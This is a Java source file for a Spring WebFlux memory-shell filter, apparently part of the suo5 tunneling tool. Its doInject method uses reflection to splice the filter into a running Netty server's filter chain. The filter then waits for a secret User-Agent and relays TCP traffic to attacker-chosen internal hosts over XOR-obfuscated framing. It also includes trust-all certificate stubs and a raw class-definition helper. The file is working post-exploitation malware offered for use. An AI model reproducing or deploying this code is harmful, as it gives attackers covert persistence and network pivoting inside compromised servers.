package org.spring.web.server;

import io.netty.channel.ChannelOption;
import org.springframework.boot.web.embedded.netty.NettyWebServer;
import org.springframework.core.io.buffer.DataBuffer;
import org.springframework.core.io.buffer.DataBufferUtils;
import org.springframework.http.MediaType;
import org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;
import org.springframework.http.server.reactive.ServerHttpRequest;
import org.springframework.http.server.reactive.ServerHttpResponse;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import org.springframework.web.server.WebHandler;
import org.springframework.web.server.adapter.HttpWebHandlerAdapter;
import org.springframework.web.server.handler.DefaultWebFilterChain;
import org.springframework.web.server.handler.ExceptionHandlingWebHandler;
import org.springframework.web.server.handler.FilteringWebHandler;
import reactor.core.publisher.Flux;
import reactor.core.publisher.Mono;
import reactor.core.publisher.Sinks;
import reactor.core.scheduler.Schedulers;
import reactor.netty.Connection;
import reactor.netty.NettyOutbound;
import reactor.netty.tcp.TcpClient;

import javax.net.ssl.SSLSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.BufferOverflowException;
import java.nio.ByteBuffer;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

public class Suo5WebFluxFilter implements WebFilter {
    public static HashMap ctx = new HashMap();

    public Suo5WebFluxFilter() {
        doInject();
    }

    public Suo5WebFluxFilter(String not) {
        System.out.println(not);
    }

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        ServerHttpRequest request = exchange.getRequest();
        org.springframework.http.server.reactive.ServerHttpResponse response = exchange.getResponse();
        String ua = request.getHeaders().getFirst("User-Agent");
        if (ua == null || !ua.equals("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3")) {
            return chain.filter(exchange);
        }

        MediaType contentType = request.getHeaders().getContentType();
        if (contentType == null) {
            return chain.filter(exchange);
        }

        if (contentType.toString().equals("application/plain")) {
            return request.getBody().flatMap(databuffer -> response.writeWith(Mono.just(databuffer))).then();
        }
        try {
            if (contentType.toString().equals("application/octet-stream")) {
                return newfullProxy(request, response);
            } else {
                return newHalfProxy(request, response);
            }
        } catch (Exception ignored) {
        }
        return Mono.empty();
    }

    private Mono<Void> newfullProxy(ServerHttpRequest request, ServerHttpResponse response) throws Exception {
        response.getHeaders().set("X-Accel-Buffering", "no");
        response.getHeaders().setContentType(MediaType.APPLICATION_OCTET_STREAM);
        Sinks.Many<byte[]> sink = Sinks.many().unicast().onBackpressureBuffer();
        Flux<HashMap<String, byte[]>> dataMaps = unmarshal(request.getBody());
        AtomicBoolean handshake = new AtomicBoolean(false);
        AtomicReference<Connection> connection = new AtomicReference<>(null);
        AtomicReference<NettyOutbound> out = new AtomicReference<>(null);

        dataMaps.doOnComplete(sink::tryEmitComplete)
                .mapNotNull(dataMap -> {
                    if (!handshake.get()) {
                        byte[] ac = dataMap.get("ac");
                        if (ac.length != 1 || ac[0] != 0x00) {
                            sink.tryEmitComplete();
                            return null;
                        }
                        handshake.set(true);

                        String host = new String(dataMap.get("h"));
                        int port = Integer.parseInt(new String(dataMap.get("p")));
                        if (port == 0) {
                            InetSocketAddress addr = request.getLocalAddress();
                            if (addr != null) {
                                host = addr.getHostString();
                                port = addr.getPort();
                            }
                        }

                        try {
                            TcpClient client = TcpClient.create()
                                    .host(host).port(port)
                                    .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 3000)
                                    .doOnConnected(c -> {
                                        connection.set(c);
                                        out.set(c.outbound());
                                        sink.tryEmitNext(marshal(newStatus((byte) 0x00)));
                                    }).doOnDisconnected(s -> {
                                        sink.tryEmitComplete();
                                    }).handle((input, output) -> input.receive()
                                            .asByteArray()
                                            .flatMap(s -> {
                                                sink.tryEmitNext(marshal(newData(s)));
                                                return Mono.empty();
                                            }));
                            client.connect().subscribe(null, (e) -> {
                                sink.tryEmitNext(marshal(newStatus((byte) 0x01)));
                                sink.tryEmitComplete();
                            });
                        } catch (Exception e) {
                            if (connection.get() != null && !connection.get().isDisposed()) {
                                connection.get().dispose();
                            }
                            sink.tryEmitNext(marshal(newStatus((byte) 0x01)));
                            sink.tryEmitComplete();
                        }
                    } else {
                        byte[] action = dataMap.get("ac");

                        try {
                            if (action == null || action.length != 1 || action[0] == 0x02) {
                                throw new RuntimeException("remove");
                            } else if (action[0] == 0x01) {
                                byte[] data = dataMap.get("dt");
                                if (data.length != 0) {
                                    out.get().sendByteArray(Mono.just(data)).then().subscribe();
                                }
                            }
                        } catch (Exception e) {
                            if (connection.get() != null && !connection.get().isDisposed()) {
                                connection.get().dispose();
                            }
                            sink.tryEmitComplete();
                        }
                    }
                    return null;
                }).subscribeOn(Schedulers.boundedElastic()).subscribe();
        return response.writeWith(sink.asFlux().map(response.bufferFactory()::wrap)).then();
    }

    private Mono<Void> newHalfProxy(ServerHttpRequest request, ServerHttpResponse response) throws Exception {
        /*
            EmitterProcessor<byte[]> processor = EmitterProcessor.create();
            FluxSink<byte[]> sink = processor.serialize().sink();
         */

        response.getHeaders().set("X-Accel-Buffering", "no");
        response.getHeaders().setContentType(MediaType.APPLICATION_OCTET_STREAM);
        Sinks.Many<byte[]> sink = Sinks.many().unicast().onBackpressureBuffer();
        Flux<HashMap<String, byte[]>> dataMaps = unmarshal(request.getBody());
        dataMaps.next()
                .subscribeOn(Schedulers.boundedElastic())
                .subscribe((dataMap -> {
                    if (dataMap == null) {
                        sink.tryEmitComplete();
                        return;
                    }
                    String clientId = new String(dataMap.get("id"));
                    byte[] actionData = dataMap.get("ac");
                    if (actionData.length != 1) {
                        sink.tryEmitComplete();
                        return;
                    }
                /*
                    ActionCreate    byte = 0x00
                    ActionData      byte = 0x01
                    ActionDelete    byte = 0x02
                    ActionHeartbeat byte = 0x03
                 */
                    byte action = actionData[0];
                    if (action == 0x02) {
                        Object[] obj = (Object[]) this.remove(clientId);
                        if (obj != null) {
                            Connection conn = (Connection) obj[0];
                            conn.dispose();
                        }
                        sink.tryEmitComplete();
                        return;
                    } else if (action == 0x01) {
                        Object[] obj = (Object[]) this.get(clientId);
                        if (obj == null) {
                            sink.tryEmitNext(marshal(newDel()));
                        } else {
                            byte[] data = dataMap.get("dt");
                            if (data.length != 0) {
                                ((NettyOutbound) obj[1]).sendByteArray(Mono.just(data))
                                        .then()
                                        .subscribeOn(Schedulers.boundedElastic())
                                        .subscribe();
                            }
                        }
                        sink.tryEmitComplete();
                        return;
                    } else if (action != 0x00) {
                        sink.tryEmitComplete();
                        return;
                    }

                    // 0x00 create new tunnel
                    String host = new String(dataMap.get("h"));
                    int port = Integer.parseInt(new String(dataMap.get("p")));
                    if (port == 0) {
                        InetSocketAddress addr = request.getLocalAddress();
                        if (addr != null) {
                            host = addr.getHostString();
                            port = addr.getPort();
                        }
                    }
                    try {
                        TcpClient client = TcpClient.create()
                                .host(host).port(port)
                                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 3000)
                                .doOnConnected(c -> {
                                    this.put(clientId, new Object[]{c, c.outbound()});
                                    sink.tryEmitNext(marshal(newStatus((byte) 0x00)));
                                }).doOnDisconnected(s -> {
                                    this.remove(clientId);
                                    sink.tryEmitComplete();
                                });
                        client.connect()
                                .subscribeOn(Schedulers.boundedElastic())
                                .subscribe(conn -> {
                                    conn.inbound()
                                            .receive()
                                            .asByteArray()
                                            .flatMap(s -> {
                                                sink.tryEmitNext(marshal(newData(s)));
                                                return Mono.empty();
                                            }).then().subscribe();
                                }, (err) -> {
                                    sink.tryEmitNext(marshal(newStatus((byte) 0x01)));
                                    sink.tryEmitComplete();
                                });
                    } catch (Exception e) {
                    }
                }));
        return response.writeWith(sink.asFlux().map(response.bufferFactory()::wrap)).then();
    }

    private HashMap newData(byte[] data) {
        HashMap m = new HashMap();
        m.put("ac", new byte[]{0x01});
        m.put("dt", data);
        return m;
    }

    private HashMap newDel() {
        HashMap m = new HashMap();
        m.put("ac", new byte[]{0x02});
        return m;
    }

    private HashMap newStatus(byte b) {
        HashMap m = new HashMap();
        m.put("s", new byte[]{b});
        return m;
    }

    byte[] u32toBytes(int i) {
        byte[] result = new byte[4];
        result[0] = (byte) (i >> 24);
        result[1] = (byte) (i >> 16);
        result[2] = (byte) (i >> 8);
        result[3] = (byte) (i);
        return result;
    }

    int bytesToU32(byte[] bytes) {
        return ((bytes[0] & 0xFF) << 24) | ((bytes[1] & 0xFF) << 16) | ((bytes[2] & 0xFF) << 8) | ((bytes[3] & 0xFF) << 0);
    }

    synchronized void put(String k, Object v) {
        ctx.put(k, v);
    }

    synchronized Object get(String k) {
        return ctx.get(k);
    }

    synchronized Object remove(String k) {
        return ctx.remove(k);
    }

    byte[] copyOfRange(byte[] original, int from, int to) {
        int newLength = to - from;
        if (newLength < 0) {
            throw new IllegalArgumentException(from + " > " + to);
        }
        byte[] copy = new byte[newLength];
        int copyLength = Math.min(original.length - from, newLength);
        // can't use System.arraycopy of Arrays.copyOf, there is no system in some environment
        // System.arraycopy(original, from, copy, 0,  copyLength);
        for (int i = 0; i < copyLength; i++) {
            copy[i] = original[from + i];
        }
        return copy;
    }


    private byte[] marshal(HashMap m) {
        try {
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            Object[] keys = m.keySet().toArray();
            for (int i = 0; i < keys.length; i++) {
                String key = (String) keys[i];
                byte[] value = (byte[]) m.get(key);
                buf.write((byte) key.length());
                buf.write(key.getBytes());
                buf.write(u32toBytes(value.length));
                buf.write(value);
            }

            byte[] data = buf.toByteArray();
            ByteBuffer dbuf = ByteBuffer.allocate(5 + data.length);
            dbuf.putInt(data.length);
            // xor key
            byte key = (byte) ((Math.random() * 255) + 1);
            dbuf.put(key);
            for (int i = 0; i < data.length; i++) {
                data[i] = (byte) (data[i] ^ key);
            }
            dbuf.put(data);
            return dbuf.array();
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }

    private Flux<HashMap<String, byte[]>> unmarshal(Flux<DataBuffer> inFlux) {
        final ByteBuffer[] buffers = {ByteBuffer.allocate(2048)};
        return Flux.create(sink -> {
            // onErrorComplete is too new to use
            inFlux.doOnComplete(sink::complete)
                    .subscribeOn(Schedulers.boundedElastic())
                    .subscribe(dataBuffer -> {
                        try {
                            ByteBuffer buffer = buffers[0];
                            ByteBuffer byteBuffer = dataBuffer.asByteBuffer().asReadOnlyBuffer();
                            while (byteBuffer.hasRemaining()) {
                                byte b = byteBuffer.get();
                                try {
                                    buffer.put(b);
                                } catch (BufferOverflowException e) {
                                    ByteBuffer newBuffer = ByteBuffer.allocate(buffer.capacity() * 2);
                                    buffer.flip();
                                    newBuffer.put(buffer);
                                    buffer = newBuffer;
                                    buffers[0] = newBuffer;
                                    buffer.put(b);
                                }
                                buffer.flip();
                                if (isCompleteMessage(buffer)) {
                                    HashMap<String, byte[]> result = processCompleteMessage(buffer);
                                    sink.next(result);
                                    buffer.compact();
                                } else {
                                    buffer.position(buffer.limit());
                                    buffer.limit(buffer.capacity());
                                }
                            }
                        } catch (Exception e) {
                            sink.complete();
                        } finally {
                            DataBufferUtils.release(dataBuffer);
                        }
                    }, (e) -> {
                        sink.complete();
                    });
        });
    }

    private boolean isCompleteMessage(ByteBuffer buffer) {
        if (buffer.remaining() < 5) {
            return false; // 不足以读取消息头
        }
        int len = buffer.getInt(buffer.position()); // 读取长度但不移动position
        return buffer.remaining() >= 5 + len; // 检查是否有足够的数据
    }

    private static int MAX_LEN = 1024 * 1024 * 32;

    private HashMap<String, byte[]> processCompleteMessage(ByteBuffer buffer) throws Exception {
        int len = buffer.getInt();
        int x = buffer.get();
        if (len > MAX_LEN) {
            throw new IOException("invalid len");
        }

        byte[] bs = new byte[len];
        buffer.get(bs);

        for (int i = 0; i < bs.length; i++) {
            bs[i] = (byte) (bs[i] ^ x);
        }

        HashMap<String, byte[]> m = new HashMap<>();
        int i = 0;
        while (i < bs.length - 1) {
            short kLen = bs[i];
            i += 1;
            if (i + kLen >= bs.length) {
                throw new Exception("key len error");
            }
            if (kLen < 0) {
                throw new Exception("key len error");
            }
            byte[] keyBytes = copyOfRange(bs, i, i + kLen);
            String key = new String(keyBytes);
            i += kLen;

            if (i + 4 >= bs.length) {
                throw new Exception("value len error");
            }
            byte[] vLenBytes = copyOfRange(bs, i, i + 4);
            int vLen = bytesToU32(vLenBytes);
            i += 4;

            if (vLen < 0 || i + vLen > bs.length) {
                throw new Exception("value error");
            }
            byte[] value = copyOfRange(bs, i, i + vLen);
            i += vLen;

            m.put(key, value);
        }
        return m;
    }

    public boolean verify(String hostname, SSLSession session) {
        return true;
    }

    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
    }

    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
    }

    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }

    public static void doInject() {
        // ref: https://github.com/mieeA/SpringWebflux-MemShell/blob/main/FilterMemshellPro.java
        Method getThreads = null;
        try {
            getThreads = Thread.class.getDeclaredMethod("getThreads");
            getThreads.setAccessible(true);
            Object threads = getThreads.invoke((Object) null);

            for (int i = 0; i < Array.getLength(threads); ++i) {
                Object thread = Array.get(threads, i);
                if (thread != null && thread.getClass().getName().contains("NettyWebServer")) {
                    NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, "this$0", false);
                    ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, "handler", false);
                    Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter, "httpHandler", false);
                    HttpWebHandlerAdapter httpWebHandlerAdapter = (HttpWebHandlerAdapter) getFieldValue(delayedInitializationHttpHandler, "delegate", false);
                    ExceptionHandlingWebHandler exceptionHandlingWebHandler = (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter, "delegate", true);
                    FilteringWebHandler filteringWebHandler = (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler, "delegate", true);
                    DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler, "chain", false);
                    Object handler = getFieldValue(defaultWebFilterChain, "handler", false);
                    List<WebFilter> newAllFilters = new ArrayList(defaultWebFilterChain.getFilters());
                    newAllFilters.add(0, new Suo5WebFluxFilter("test"));
                    DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
                    Field f = filteringWebHandler.getClass().getDeclaredField("chain");
                    f.setAccessible(true);
                    Field modifersField = Field.class.getDeclaredField("modifiers");
                    modifersField.setAccessible(true);
                    modifersField.setInt(f, f.getModifiers() & -17);
                    f.set(filteringWebHandler, newChain);
                    modifersField.setInt(f, f.getModifiers() & 16);
                }
            }
        } catch (Exception var16) {
        }
    }


    public static Object getFieldValue(Object obj, String fieldName, boolean superClass) throws Exception {
        Field f;
        if (superClass) {
            f = obj.getClass().getSuperclass().getDeclaredField(fieldName);
        } else {
            f = obj.getClass().getDeclaredField(fieldName);
        }
        f.setAccessible(true);
        return f.get(obj);
    }

    private static Class defineClass(byte[] classbytes) throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        method.setAccessible(true);
        return (Class) method.invoke(urlClassLoader, classbytes, 0, classbytes.length);
    }
}
